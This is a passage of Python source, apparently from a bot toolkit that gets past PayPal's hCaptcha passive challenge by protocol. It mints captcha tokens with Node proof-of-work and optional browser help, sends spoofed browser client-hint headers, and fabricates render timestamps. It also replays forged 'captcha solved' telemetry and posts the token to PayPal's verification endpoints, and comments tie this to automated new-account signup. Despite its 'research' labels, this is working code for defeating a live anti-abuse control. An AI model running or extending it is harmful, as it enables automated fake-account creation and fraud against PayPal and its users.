    # Proven 2026-07-16: ExtType 18 fix unblocks HTTP 415 → token_len>0.
    # Still NOT pure happy-dom (browser only for PoW n). Enable explicitly:
    #   MIN_BA_HCAPTCHA_SEMI_HYBRID_RESEARCH=1  or  MIN_BA_HCAPTCHA_HYBRID_RESEARCH=1
    # Optional auto after pure node fails: MIN_BA_HCAPTCHA_SEMI_HYBRID_AUTO=1
    if _truthy("MIN_BA_HCAPTCHA_SEMI_HYBRID_RESEARCH", False) or _truthy(
        "MIN_BA_HCAPTCHA_HYBRID_RESEARCH", False
    ):
        # 1) Semi-hybrid: browser PoW n only, Node encrypt+HTTP+decrypt
        if _truthy("MIN_BA_HCAPTCHA_SEMI_HYBRID_RESEARCH", False) or not _truthy(
            "MIN_BA_HCAPTCHA_FULL_PACK_HYBRID", False
        ):
            try:
                from _research_semi_hybrid_mint import mint_semi_hybrid

                hy = mint_semi_hybrid(region=(os.environ.get("MIN_BA_HCAP_REGION") or "MX"))
                if hy.get("ok") and hy.get("token"):
                    out.update(
                        ok=True,
                        token=str(hy["token"]),
                        source="semi_hybrid_research",
                        renderData={
                            "hcaptchaPassiveRenderStartTime": int(time.time() * 1000) - 2500,
                            "hcaptchaPassiveRenderEndTime": int(time.time() * 1000) - 800,
                            "hcaptchaPassiveVerificationTime": int(time.time() * 1000) - 200,
                        },
                    )
                    log.warning(
                        "HTTP-FP semi-hybrid RESEARCH mint ok token_len=%d n_len=%s packed=%s",
                        len(out["token"]),
                        hy.get("n_len"),
                        hy.get("packed"),
                    )
                    return out
                out["error"] = f"semi_hybrid_fail:{hy.get('error')}"
                log.warning("HTTP-FP semi-hybrid research failed: %s", out["error"])
            except Exception as e:
                out["error"] = f"semi_hybrid_exc:{type(e).__name__}:{e}"
                log.warning("HTTP-FP semi-hybrid research exc: %s", out["error"])
        # 2) Full-pack hybrid fallback (Chrome builds entire pack)
        if _truthy("MIN_BA_HCAPTCHA_HYBRID_RESEARCH", False) and not out.get("ok"):
            try:
                from _research_hybrid_mint import mint_hybrid_research

                hy = mint_hybrid_research(proxy=proxy, timeout=max(timeout, 70))
                if hy.get("ok") and hy.get("token"):
                    out.update(
                        ok=True,
                        token=str(hy["token"]),
                        source="hybrid_research",
                        renderData={
                            "hcaptchaPassiveRenderStartTime": int(time.time() * 1000) - 2500,
                            "hcaptchaPassiveRenderEndTime": int(time.time() * 1000) - 800,
                            "hcaptchaPassiveVerificationTime": int(time.time() * 1000) - 200,
                        },
                    )
                    log.warning(
                        "HTTP-FP hybrid RESEARCH mint ok token_len=%d (not pure happy-dom)",
                        len(out["token"]),
                    )
                    return out
                out["error"] = (out.get("error") or "") + f"|hybrid_fail:{hy.get('error')}"
                log.warning("HTTP-FP hybrid research failed: %s", out["error"])
            except Exception as e:
                out["error"] = (out.get("error") or "") + f"|hybrid_exc:{type(e).__name__}:{e}"
                log.warning("HTTP-FP hybrid research exc: %s", out["error"])

    skip_node = _truthy("MIN_BA_SKIP_HCAPTCHA_NODE", False) or _truthy(
        "PPS_SKIP_HCAPTCHA_NODE", False
    )
    iframe_url = (iframe_url or "").strip()
    if not iframe_url and not skip_node:
        out["error"] = "no_iframe_url"
        return out

    stderr_tail = ""
    if skip_node:
        out["error"] = "skipped_node_by_env"
        log.info("HTTP-FP skip happy-dom node — protocol/semi-hybrid only")
    else:
        helper, helper_mode = _resolve_hcaptcha_helper()
        run = _run_hcaptcha_node_helper(
            helper,
            helper_mode,
            iframe_url=iframe_url,
            parent_url=parent_url,
            timeout=timeout,
            user_agent=user_agent,
            proxy=proxy,
            html=html,
            browser_profile=browser_profile,
            screen=screen,
            viewport=viewport,
            accept_language=accept_language,
        )
        out.update({k: v for k, v in run.items() if k != "stderr_tail"})
        stderr_tail = run.get("stderr_tail") or ""

    # auto / bridge-empty → legacy fallback.
    # Default ON for timeout/no_token (G10: bridge loads JS + iframes but never mints).
    # Disable with MIN_BA_HCAPTCHA_LEGACY_FALLBACK=0.
    mode_env = (os.environ.get("MIN_BA_HCAPTCHA_NODE_HELPER") or "bridge").strip().lower()
    allow_legacy = mode_env == "auto" or _truthy(
        "MIN_BA_HCAPTCHA_LEGACY_FALLBACK", True  # default True — pure-HTTP second shot
    )
    if (
        (not out.get("ok"))
        and (not skip_node)
        and allow_legacy
        and (out.get("helper_mode") or "bridge") == "bridge"
        and HCAPTCHA_JS_LEGACY.exists()
    ):
        log.warning(
            "HTTP-FP bridge no token (%s) — trying legacy helper",
            (out.get("error") or "")[:80],
        )
        run2 = _run_hcaptcha_node_helper(
            HCAPTCHA_JS_LEGACY,
            "legacy",
            iframe_url=iframe_url,
            parent_url=parent_url,
            timeout=timeout,
            user_agent=user_agent,
            proxy=proxy,
            html=html,
            browser_profile=browser_profile,
            screen=screen,
            viewport=viewport,
            accept_language=accept_language,
        )
        if run2.get("ok"):
            out.update({k: v for k, v in run2.items() if k != "stderr_tail"})
            stderr_tail = run2.get("stderr_tail") or stderr_tail
        else:
            out["error"] = (
                f"bridge:{(out.get('error') or '')}|legacy:{(run2.get('error') or '')}"
            )
            stderr_tail = (run2.get("stderr_tail") or "") + "\n" + stderr_tail

    # Pure-protocol getcaptcha (curl_cffi csc + Node PoW + ExtType18 pack).
    # Default ON after happy-dom timeout — zero browser binary.
    if (not out.get("ok")) and _truthy("MIN_BA_HCAPTCHA_PROTOCOL_MINT", True):
        try:
            sk = extract_hcaptcha_site_key("", iframe_url) or (
                re.search(r"siteKey=([0-9a-fA-F-]{20,})", iframe_url or "", re.I) or [None, ""]
            )[1]
            proto = mint_hcaptcha_passive_protocol(
                site_key=sk or "884d15d9-b649-4bbb-8d1c-2d6f0eed75eb",
                host="www.paypalobjects.com",
                proxy=proxy,
                user_agent=user_agent or UA,
                hl=(
                    "pt"
                    if "pt_BR" in (iframe_url or "") or "pt-BR" in (accept_language or "")
                    else "en"
                ),
                timeout=max(timeout, 90),
            )
            if proto.get("ok") and proto.get("token"):
                out.update(
                    ok=True,
                    token=str(proto["token"]),
                    source="protocol_mint",
                    host_sum=proto.get("host_sum"),
                    n_len=proto.get("n_len"),
                    pow_ms=proto.get("pow_ms"),
                    device_profile=proto.get("device_profile"),
                    renderData={
                        "hcaptchaPassiveRenderStartTime": int(time.time() * 1000) - 2500,
                        "hcaptchaPassiveRenderEndTime": int(time.time() * 1000) - 800,
                        "hcaptchaPassiveVerificationTime": int(time.time() * 1000) - 200,
                    },
                )
                log.info(
                    "HTTP-FP protocol mint OK token_len=%d n_len=%s host_sum=%s profile=%s",
                    len(out["token"]),
                    proto.get("n_len"),
                    proto.get("host_sum"),
                    proto.get("device_profile"),
                )
            else:
                out["error"] = (out.get("error") or "") + f"|protocol:{(proto.get('error') or '')[:120]}"
                out["host_sum"] = proto.get("host_sum")
                out["n_len"] = proto.get("n_len")
                out["device_profile"] = proto.get("device_profile")
                log.warning(
                    "HTTP-FP protocol mint fail: %s host_sum=%s profile=%s",
                    (proto.get("error") or "")[:160],
                    proto.get("host_sum"),
                    proto.get("device_profile"),
                )
        except Exception as e:
            out["error"] = (out.get("error") or "") + f"|protocol_exc:{type(e).__name__}:{e}"
            log.warning("HTTP-FP protocol mint exc: %s", e)

    # After pure/bridge/protocol fails: optional semi-hybrid recovery (Chrome n only).
    # Research-grade: browser used ONLY for hsw(req) PoW; encrypt+getcaptcha stay pure HTTP.
    # Enable: MIN_BA_HCAPTCHA_SEMI_HYBRID_AUTO=1
    if (not out.get("ok")) and _truthy("MIN_BA_HCAPTCHA_SEMI_HYBRID_AUTO", False):
        try:
            from _research_semi_hybrid_mint import mint_semi_hybrid

            hy = mint_semi_hybrid(region=(os.environ.get("MIN_BA_HCAP_REGION") or "MX"))
            if hy.get("ok") and hy.get("token"):
                out.update(
                    ok=True,
                    token=str(hy["token"]),
                    source="semi_hybrid_auto",
                    renderData={
                        "hcaptchaPassiveRenderStartTime": int(time.time() * 1000) - 2500,
                        "hcaptchaPassiveRenderEndTime": int(time.time() * 1000) - 800,
                        "hcaptchaPassiveVerificationTime": int(time.time() * 1000) - 200,
                    },
                )
                log.warning(
                    "HTTP-FP semi-hybrid AUTO mint ok token_len=%d (browser n; not pure)",
                    len(out["token"]),
                )
            else:
                out["error"] = (out.get("error") or "") + f"|semi_auto:{hy.get('error')}"
        except Exception as e:
            out["error"] = (out.get("error") or "") + f"|semi_auto_exc:{type(e).__name__}:{e}"

    if out.get("ok"):
        log.info(
            "HTTP-FP hcaptcha passive token len=%d source=%s states=%s",
            len(out.get("token") or ""),
            out.get("source"),
            ",".join(str(x) for x in (out.get("states") or [])[:5]),
        )
    else:
        log.warning(
            "HTTP-FP hcaptcha no token: %s states=%s",
            out.get("error"),
            out.get("states"),
        )

    # Debug artifact (local, no secrets beyond token length)
    try:
        art = ROOT / "_ba_http_fp_hcaptcha_last.json"
        art.write_text(
            json.dumps(
                {
                    "ok": out.get("ok"),
                    "token_len": len(out.get("token") or ""),
                    "error": out.get("error"),
                    "states": out.get("states"),
                    "elapsedMs": out.get("elapsedMs"),
                    "iframeCount": out.get("iframeCount"),
                    "iframeSrcs": out.get("iframeSrcs"),
                    "messageCount": out.get("messageCount"),
                    "recentMessages": out.get("recentMessages"),
                    "source": out.get("source"),
                    "helper_mode": out.get("helper_mode"),
                    "device_profile": out.get("device_profile")
                    or os.environ.get("MIN_BA_POW_DEVICE_PROFILE"),
                    "host_sum": out.get("host_sum"),
                    "n_len": out.get("n_len"),
                    "pow_ms": out.get("pow_ms"),
                    "stderr_tail": (stderr_tail or "")[-1500:],
                },
                ensure_ascii=False,
                indent=2,
            ),
            encoding="utf-8",
        )
        # Mirror mint verify summary for stage docs
        (ROOT / "_ba_bridge_mint_verify.json").write_text(
            json.dumps(
                {
                    "ok": out.get("ok"),
                    "token_len": len(out.get("token") or ""),
                    "source": out.get("source"),
                    "error": out.get("error"),
                    "states": out.get("states"),
                    "helper_mode": out.get("helper_mode"),
                },
                ensure_ascii=False,
                indent=2,
            ),
            encoding="utf-8",
        )
    except Exception:
        pass
    return out


def _ch_headers() -> dict[str, str]:
    return {
        "User-Agent": UA,
        "Accept": "*/*",
        "Accept-Language": "en-US,en;q=0.9",
        "Sec-CH-UA": SEC_CH_UA,
        "Sec-CH-UA-Full-Version-List": SEC_CH_UA_FULL_VERSION_LIST,
        "Sec-CH-UA-Platform": SEC_CH_UA_PLATFORM,
        "Sec-CH-UA-Model": SEC_CH_UA_MODEL,
        "Sec-CH-UA-Mobile": "?0",
        "Sec-CH-UA-Arch": SEC_CH_UA_ARCH,
        "Sec-CH-Device-Memory": "8",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty",
        "X-Requested-With": "fetch",
    }


def logclientdata_states(
    session: Any,
    *,
    challenge_html: str,
    csrf: str,
    session_id: str,
    captcha_states: list[str],
    page_url: str,
    ec_token: str = "",
    timeout: int = 15,
) -> None:
    """Replay /auth/logclientdata captcha-state telemetry (protocol-faithful)."""
    now_ms = int(time.time() * 1000)
    base_fpti = {
        "pgrp": "main:authchallenge::checkoutweb:signup",
        "page": "main:authchallenge::checkoutweb:signup",
        "qual": "",
        "pgtf": "Nodejs",
        "s": "ci",
        "env": "live",
        "comp": "checkoutuinodeweb",
        "tsrce": "xorouternodeweb",
        "cu": "1",
        "ef_policy": "gdpr_v2.1",
        "pxpguid": "",
        "pgst": str(now_ms),
        "calc": "".join(random.choices("0123456789abcdef", k=13)),
        "csci": "".join(random.choices("0123456789abcdef", k=32)),
        "nsid": session_id,
        "rsta": "en_US",
        "ccpg": "US",
        "flnm": "Weasley",
        "fltk": ec_token or "",
    }
    headers = {
        **_ch_headers(),
        "Content-Type": "application/json",
        "Origin": PP_ORIGIN,
        "Referer": page_url,
    }
    for state in captcha_states:
        fpti = dict(base_fpti)
        fpti["captchaState"] = state
        fpti["pgst"] = str(int(time.time() * 1000))
        fpti["calc"] = "".join(random.choices("0123456789abcdef", k=13))
        body = {"fpti": fpti, "_csrf": csrf, "_sessionID": session_id}
        try:
            r = session.post(
                f"{PP_ORIGIN}/auth/logclientdata",
                json=body,
                headers=headers,
                timeout=timeout,
            )
            log.info(
                "HTTP-FP logclientdata %-45s status=%s",
                state,
                getattr(r, "status_code", "?"),
            )
        except Exception as e:
            log.debug("HTTP-FP logclientdata %s soft-fail: %s", state, e)


def build_hcaptcha_validate_form(
    challenge_html: str,
    token: str,
    *,
    site_key: str = "",
    render_data: Optional[dict] = None,
) -> dict[str, str]:
    """Build the correct /auth/validatecaptcha form for hCaptcha passive.

    GPT_PLUS_PP capture uses: hcaptchaToken + publicKey + jse + timestamps.
    min-implant v1 incorrectly dual-bound g-recaptcha-response only.
    """
    render_data = render_data or {}
    csrf = _html_input_value(challenge_html, "_csrf") or _html_attr_value(
        challenge_html, "data-csrf"
    )
    request_id = _html_input_value(challenge_html, "_requestId")
    hsh = _html_input_value(challenge_html, "_hash")
    session_id = _html_input_value(challenge_html, "_sessionID") or _html_attr_value(
        challenge_html, "data-sessionid"
    )
    jse = _html_attr_value(challenge_html, "data-jse")
    iframe_src = extract_hcaptcha_passive_iframe_src(challenge_html)
    site_key = site_key or extract_hcaptcha_site_key(challenge_html, iframe_src)

    now = int(time.time() * 1000)
    render_start = int(
        render_data.get("hcaptchaPassiveRenderStartTime")
        or render_data.get("hcaptcha_passive_render_start_time_utc")
        or render_data.get("renderStartTime")
        or (now - random.randint(3500, 6500))
    )
    render_end = int(
        render_data.get("hcaptchaPassiveRenderEndTime")
        or render_data.get("hcaptcha_passive_render_end_time_utc")
        or render_data.get("renderEndTime")
        or (now - random.randint(500, 1800))
    )
    verify_ts = int(
        render_data.get("hcaptchaPassiveVerificationTime")
        or render_data.get("hcaptcha_passive_verification_time_utc")
        or render_data.get("verificationTime")
        or now
    )
    return {
        "_csrf": csrf,
        "_requestId": request_id,
        "_hash": hsh,
        "_sessionID": session_id,
        "jse": jse,
        "hcaptchaToken": token,
        "publicKey": site_key,
        "hcaptcha_passive_eval_start_time_utc": str(render_start - random.randint(250, 900)),
        "hcaptcha_passive_render_start_time_utc": str(render_start),
        "hcaptcha_passive_render_end_time_utc": str(render_end),
        "hcaptcha_passive_verification_time_utc": str(verify_ts),
        # compatibility aliases some PayPal paths still read
        "hCaptchaPassiveEval": token,
        "h-captcha-response": token,
    }


def form_fields_complete(form: dict[str, str]) -> tuple[bool, list[str]]:
    missing = [
        k
        for k in ("_csrf", "_requestId", "_hash", "_sessionID", "jse", "hcaptchaToken", "publicKey")
        if not (form.get(k) or "").strip()
    ]
    return (not missing, missing)


def resolve_captcha_submit_plan(challenge_html: str) -> dict[str, Any]:
    """Choose verify vs validate endpoint from data-captcha-type ONLY.

    Returns:
      family, primary_url, token_field, also_validate

    Never scan HTML body for \"recaptcha\" — visual hCaptcha iframe is named
    recaptcha historically and would false-route token fields.
    """
    captcha_type = (_html_attr_value(challenge_html, "data-captcha-type") or "").strip().lower()
    if captcha_type == "hcaptchapassive" or (
        not captcha_type and is_hcaptcha_passive_challenge(challenge_html)
    ):
        return {
            "family": "hcaptcha_passive",
            "primary_url": f"{PP_ORIGIN}/auth/verifyhcaptchapassive",
            "token_field": "hcaptchaToken",
            "also_validate": _truthy("MIN_BA_HCAPTCHA_ALSO_VALIDATE", False),
        }
    if captcha_type == "recaptchav3":
        return {
            "family": "recaptchav3",
            "primary_url": f"{PP_ORIGIN}/auth/validatecaptcha",
            "token_field": "grcV3EntToken",
            "also_validate": False,
        }
    if captcha_type == "hcaptcha":
        return {
            "family": "hcaptcha",
            "primary_url": f"{PP_ORIGIN}/auth/validatecaptcha",
            "token_field": "hcaptcha",
            "also_validate": False,
        }
    # recaptcha default or unknown
    return {
        "family": "recaptcha",
        "primary_url": f"{PP_ORIGIN}/auth/validatecaptcha",
        "token_field": "recaptcha",
        "also_validate": False,
    }


def build_hcaptcha_passive_verify_form(
    challenge_html: str,
    token: str,
    *,
    site_key: str = "",
    render_data: Optional[dict] = None,
) -> dict[str, str]:
    """Form for POST /auth/verifyhcaptchapassive (flow.py L4165–4174)."""
    # Same field core as validate form — endpoint differs.
    form = build_hcaptcha_validate_form(
        challenge_html, token, site_key=site_key, render_data=render_data
    )
    # verify endpoint historically omits recaptcha dual-bind noise; keep core only
    keep = {
        "_csrf",
        "_sessionID",
        "_requestId",
        "_hash",
        "jse",
        "hcaptchaToken",
        "publicKey",
        "hcaptcha_passive_eval_start_time_utc",
        "hcaptcha_passive_render_start_time_utc",
        "hcaptcha_passive_render_end_time_utc",
        "hcaptcha_passive_verification_time_utc",
    }
    return {k: v for k, v in form.items() if k in keep and (v or "").strip() != ""}


def post_verify_hcaptcha_passive(
    session: Any,
    *,
    challenge_html: str,
    page_url: str,
    token: str,
    render_data: Optional[dict] = None,
    site_key: str = "",
    timeout: int = 30,
) -> dict[str, Any]:
    """POST https://www.paypal.com/auth/verifyhcaptchapassive with protocol fields."""
    out: dict[str, Any] = {
        "ok": False,
        "status": None,
        "kind": "",
        "response_head": "",
        "error": "",
        "endpoint": f"{PP_ORIGIN}/auth/verifyhcaptchapassive",
    }
    iframe_src = extract_hcaptcha_passive_iframe_src(challenge_html)
    site_key = site_key or extract_hcaptcha_site_key(challenge_html, iframe_src)
    form = build_hcaptcha_passive_verify_form(
        challenge_html, token, site_key=site_key, render_data=render_data
    )
    out["fields"] = sorted(form.keys())
    out["missing"] = [
        k
        for k in (
            "_csrf",
            "_sessionID",
            "hcaptchaToken",
            "publicKey",
            "hcaptcha_passive_render_start_time_utc",
            "hcaptcha_passive_render_end_time_utc",
            "hcaptcha_passive_verification_time_utc",
        )
        if not (form.get(k) or "").strip()
    ]
    headers = {
        **_ch_headers(),
        "Content-Type": "application/x-www-form-urlencoded",
        "Origin": PP_ORIGIN,
        "Referer": page_url or PP_ORIGIN,
        "X-Requested-With": "XMLHttpRequest",
        "Accept": "*/*",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty",
    }
    try:
        r = session.post(
            out["endpoint"],
            data=form,
            headers=headers,
            timeout=max(15, min(timeout, 40)),
        )
        text = r.text or ""
        out["status"] = getattr(r, "status_code", None)
        out["response_head"] = text[:400]
        if text.lstrip().startswith("{"):
            out["kind"] = "json"
        elif text.lstrip().startswith("<"):
            out["kind"] = "html"
        else:
            out["kind"] = "text"
        # Accept 200/202/204/302; reject another authchallenge shell
        st = out["status"]
        if st in (302, 303):
            out["ok"] = True
        elif st in (200, 202, 204):
            low = text[:800].lower()
            out["ok"] = (
                "authchallenge" not in low
                and "captcha-standalone" not in low
                and "errors" not in low
            )
        else:
            out["ok"] = False
        if not out["ok"]:
            out["error"] = f"verify_reject status={st} kind={out['kind']}"
        log.info(
            "HTTP-FP verifyhcaptchapassive status=%s ok=%s fields=%s",
            st,
            out["ok"],
            out["fields"],
        )
    except Exception as e:
        out["error"] = f"verify_post:{type(e).__name__}:{e}"
        log.warning("HTTP-FP verifyhcaptchapassive: %s", out["error"])
    # Artifact for isolation tests (no full token)
    try:
        art = ROOT / "_ba_verify_hcaptcha_last.json"
        art.write_text(
            json.dumps(
                {
                    "ok": out["ok"],
                    "status": out["status"],
                    "kind": out["kind"],
                    "fields": out["fields"],
                    "missing": out["missing"],
                    "token_len": len(token or ""),
                    "error": out.get("error"),
                    "response_head": out.get("response_head"),
                    "endpoint": out["endpoint"],
                },
                ensure_ascii=False,
                indent=2,
            ),
            encoding="utf-8",
        )
    except Exception:
        pass
    return out


def post_validate_captcha(
    session: Any,
    *,
    challenge_html: str,
    page_url: str,
    token: str,
    family: str = "hcaptcha_passive",
    site_key: str = "",
    render_data: Optional[dict] = None,
    timeout: int = 30,
) -> dict[str, Any]:
    """POST /auth/validatecaptcha with family-appropriate fields."""
    out: dict[str, Any] = {
        "ok": False,
        "status": None,
        "kind": "",
        "response_head": "",
        "error": "",
        "endpoint": f"{PP_ORIGIN}/auth/validatecaptcha",
    }
    iframe_src = extract_hcaptcha_passive_iframe_src(challenge_html)
    site_key = site_key or extract_hcaptcha_site_key(challenge_html, iframe_src)
    now = int(time.time() * 1000)
    rd = render_data or {}
    if family == "hcaptcha_passive":
        form = build_hcaptcha_validate_form(
            challenge_html, token, site_key=site_key, render_data=render_data
        )
    elif family == "hcaptcha":
        # Visual hCaptcha: field name is "hcaptcha" (NOT hcaptchaToken)
        form = {
            "_csrf": _html_input_value(challenge_html, "_csrf")
            or _html_attr_value(challenge_html, "data-csrf"),
            "_requestId": _html_input_value(challenge_html, "_requestId"),
            "_hash": _html_input_value(challenge_html, "_hash"),
            "_sessionID": _html_input_value(challenge_html, "_sessionID")
            or _html_attr_value(challenge_html, "data-sessionid"),
            "jse": _html_attr_value(challenge_html, "data-jse"),
            "hcaptcha": token,
            "publicKey": site_key,
            "hcaptcha_render_start_time_utc": str(
                rd.get("hcaptchaRenderStartTime")
                or rd.get("hcaptcha_render_start_time_utc")
                or (now - random.randint(3500, 6500))
            ),
            "hcaptcha_render_end_time_utc": str(
                rd.get("hcaptchaRenderEndTime")
                or rd.get("hcaptcha_render_end_time_utc")
                or (now - random.randint(80, 400))
            ),
            "hcaptcha_verification_time_utc": str(
                rd.get("hcaptchaVerificationTime")
                or rd.get("hcaptcha_verification_time_utc")
                or now
            ),
        }
    elif family == "recaptchav3":
        form = {
            "_csrf": _html_input_value(challenge_html, "_csrf")
            or _html_attr_value(challenge_html, "data-csrf"),
            "_sessionID": _html_input_value(challenge_html, "_sessionID")
            or _html_attr_value(challenge_html, "data-sessionid"),
            "grcV3EntToken": token,
        }
    else:
        form = {
            "_csrf": _html_input_value(challenge_html, "_csrf")
            or _html_attr_value(challenge_html, "data-csrf"),
            "_sessionID": _html_input_value(challenge_html, "_sessionID")
            or _html_attr_value(challenge_html, "data-sessionid"),
            "recaptcha": token,
            "g-recaptcha-response": token,
        }
    out["fields"] = sorted(k for k in form.keys() if form.get(k))
    headers = {
        **_ch_headers(),
        "Content-Type": "application/x-www-form-urlencoded",
        "Origin": PP_ORIGIN,
        "Referer": page_url or PP_ORIGIN,
        "X-Requested-With": "XMLHttpRequest",
    }
    try:
        r = session.post(
            out["endpoint"],
            data=form,
            headers=headers,
            timeout=max(15, min(timeout, 40)),
        )
        text = r.text or ""
        out["status"] = getattr(r, "status_code", None)
        out["response_head"] = text[:400]
        if text.lstrip().startswith("{"):
            out["kind"] = "json"
        elif text.lstrip().startswith("<"):
            out["kind"] = "html"
        else:
            out["kind"] = "text"
        st = out["status"]
        low = text[:800].lower()
        out["ok"] = st in (200, 202, 204, 302, 303) and "authchallenge" not in low
        if not out["ok"]:
            out["error"] = f"validate_reject status={st} kind={out['kind']}"
        log.info(
            "HTTP-FP validatecaptcha status=%s ok=%s family=%s",
            st,
            out["ok"],
            family,
        )
    except Exception as e:
        out["error"] = f"validate_post:{type(e).__name__}:{e}"
        log.warning("HTTP-FP validatecaptcha: %s", out["error"])
    return out


def submit_authchallenge_solution(
    session: Any,
    *,
    challenge_html: str,
    page_url: str,
    token: str,
    render_data: Optional[dict] = None,
    ec_token: str = "",
    timeout: int = 30,
) -> dict[str, Any]:
    """Mint-agnostic submit: plan endpoint → verify and/or validate + SOLVED telemetry."""
    plan = resolve_captcha_submit_plan(challenge_html)
    result: dict[str, Any] = {
        "ok": False,
        "plan": plan,
        "verify": None,
        "validate": None,
        "error": "",
    }
    csrf = _html_input_value(challenge_html, "_csrf") or _html_attr_value(
        challenge_html, "data-csrf"
    )
    session_id = _html_input_value(challenge_html, "_sessionID") or _html_attr_value(
        challenge_html, "data-sessionid"
    )
    site_key = extract_hcaptcha_site_key(
        challenge_html, extract_hcaptcha_passive_iframe_src(challenge_html)
    )
    # Pre-solved telemetry (caller may already have sent SERVED/LOADED)
    try:
        logclientdata_states(
            session,
            challenge_html=challenge_html,
            csrf=csrf,
            session_id=session_id,
            captcha_states=[
                "CLIENT_SIDE_HCAPTCHA_PASSIVE_SOLVED"
                if plan["family"] == "hcaptcha_passive"
                else "CLIENT_SIDE_HCAPTCHA_SOLVED"
                if plan["family"] == "hcaptcha"
                else "CLIENT_SIDE_RECAPTCHA_SOLVED",
                "CLIENT_SIDE_PPCAPTCHA_SOLVED",
            ],
            page_url=page_url,
            ec_token=ec_token,
            timeout=min(12, timeout),
        )
    except Exception:
        pass

    if plan["family"] == "hcaptcha_passive":
        v = post_verify_hcaptcha_passive(
            session,
            challenge_html=challenge_html,
            page_url=page_url,
            token=token,
            render_data=render_data,
            site_key=site_key,
            timeout=timeout,
        )
        result["verify"] = {
            k: v.get(k)
            for k in ("ok", "status", "kind", "error", "fields", "missing", "endpoint")
        }
        if plan.get("also_validate") or not v.get("ok"):
            # optional second shot / fallback to validate form
            val = post_validate_captcha(
                session,
                challenge_html=challenge_html,
                page_url=page_url,
                token=token,
                family="hcaptcha_passive",
                site_key=site_key,
                render_data=render_data,
                timeout=timeout,
            )
            result["validate"] = {
                k: val.get(k) for k in ("ok", "status", "kind", "error", "fields", "endpoint")
            }
            result["ok"] = bool(v.get("ok") or val.get("ok"))
        else:
            result["ok"] = bool(v.get("ok"))
        if not result["ok"]:
            result["error"] = (v.get("error") or "") + (
                "|" + (result.get("validate") or {}).get("error", "")
                if result.get("validate")
                else ""
            )
        return result

    val = post_validate_captcha(
        session,
        challenge_html=challenge_html,
        page_url=page_url,
        token=token,
        family=plan["family"],
        site_key=site_key,
        render_data=render_data,
        timeout=timeout,
    )
    result["validate"] = {
        k: val.get(k) for k in ("ok", "status", "kind", "error", "fields", "endpoint")
    }
    result["ok"] = bool(val.get("ok"))
    result["error"] = val.get("error") or ""
    return result


def validate_hcaptcha_passive(
    session: Any,
    *,
    challenge_html: str,
    page_url: str,
    proxy: Optional[str] = None,
    timeout: int = 90,
    ec_token: str = "",
    user_agent: str = "",
    browser_profile: Optional[dict] = None,
    screen: Optional[dict] = None,
    viewport: Optional[dict] = None,
    accept_language: str = "",
) -> dict[str, Any]:
    """End-to-end pure protocol: mint passive token → logclientdata → validatecaptcha.

    Does NOT consent / SMS / signup. Safe for entry-gate research.
    """
    result: dict[str, Any] = {
        "ok": False,
        "token_len": 0,
        "validate_status": None,
        "validate_kind": "",
        "error": "",
        "source": "",
        "missing_fields": [],
    }
    if not is_hcaptcha_passive_challenge(challenge_html):
        result["error"] = "not_hcaptcha_passive"
        return result

    iframe_src = extract_hcaptcha_passive_iframe_src(challenge_html)
    site_key = extract_hcaptcha_site_key(challenge_html, iframe_src)
    csrf = _html_input_value(challenge_html, "_csrf") or _html_attr_value(
        challenge_html, "data-csrf"
    )
    session_id = _html_input_value(challenge_html, "_sessionID") or _html_attr_value(
        challenge_html, "data-sessionid"
    )

    logclientdata_states(
        session,
        challenge_html=challenge_html,
        csrf=csrf,
        session_id=session_id,
        captcha_states=[
            "CLIENT_SIDE_HCAPTCHA_PASSIVE_SERVED",
            "CLIENT_SIDE_HCAPTCHA_PASSIVE_SCRIPT_ONLOAD",
            "CLIENT_SIDE_HCAPTCHA_PASSIVE_JS_LOADED",
        ],
        page_url=page_url,
        ec_token=ec_token,
        timeout=min(15, timeout),
    )

    # Prefetch bridge HTML via the same curl_cffi session (proxy/TLS) so the
    # Node helper does not depend on plain Node HTTPS from a bare IP.
    bridge_html = ""
    ua_eff = (user_agent or UA).strip() or UA
    if iframe_src:
        try:
            br = session.get(
                iframe_src,
                headers={
                    "User-Agent": ua_eff,
                    "Accept": "text/html,*/*",
                    "Referer": page_url or PP_ORIGIN,
                },
                timeout=min(25, timeout),
            )
            if getattr(br, "status_code", 0) == 200 and (br.text or ""):
                bridge_html = br.text
                log.info("HTTP-FP prefetched bridge html len=%d", len(bridge_html))
        except Exception as e:
            log.debug("HTTP-FP bridge prefetch soft-fail: %s", e)

    region = (os.environ.get("MIN_BA_HCAP_REGION") or "MX").upper()
    prof = browser_profile or _default_browser_profile(region)
    mint = mint_hcaptcha_passive_token(
        iframe_url=iframe_src or page_url,
        parent_url=page_url,
        timeout=timeout,
        user_agent=ua_eff,
        proxy=proxy,
        html=bridge_html,
        browser_profile=prof,
        screen=screen,
        viewport=viewport,
        accept_language=accept_language,
    )
    result["source"] = mint.get("source") or ""
    result["mint_error"] = mint.get("error") or ""
    result["mint_states"] = mint.get("states") or []
    token = mint.get("token") or ""
    if not token:
        result["error"] = f"no_token:{mint.get('error')}"
        return result
    # CRITICAL: ba_authorize._handle_authchallenge requires token for
    # _post_authchallenge_form_close (hcaptchaToken field). Always surface
    # mint product even when subsequent verify is soft/hard reject.
    result["token"] = token
    result["token_len"] = len(token)
    result["renderData"] = mint.get("renderData") or {}

    # §3.2: passive → verifyhcaptchapassive (primary); optional validate fallback
    # ba_authorize will ALSO form_close + re-POST SignUpNewMember (flow path).
    sub = submit_authchallenge_solution(
        session,
        challenge_html=challenge_html,
        page_url=page_url,
        token=token,
        render_data=mint.get("renderData") or {},
        ec_token=ec_token,
        timeout=max(20, min(timeout, 40)),
    )
    result["submit_plan"] = sub.get("plan")
    result["verify"] = sub.get("verify")
    result["validate"] = sub.get("validate")
    result["submit_ok"] = bool(sub.get("ok"))
    # ok=True when mint produced a real token — authorize caller owns form_close
    # / SignUp retry. submit_ok remains separately for probe diagnostics.
    result["ok"] = True
    if not sub.get("ok"):
        result["error"] = sub.get("error") or "submit_soft_fail"
        # legacy fields for callers
        v = sub.get("verify") or sub.get("validate") or {}
        result["validate_status"] = v.get("status")
        result["validate_kind"] = v.get("kind")
        result["response_head"] = ""
        log.warning(
            "HTTP-FP submit REJECT (token still returned) plan=%s err=%s token_len=%d",
            (sub.get("plan") or {}).get("primary_url"),
            (result["error"] or "")[:120],
            result["token_len"],
        )
    else:
        v = sub.get("verify") or sub.get("validate") or {}
        result["validate_status"] = v.get("status")
        result["validate_kind"] = v.get("kind")
        result["error"] = ""
        log.info(
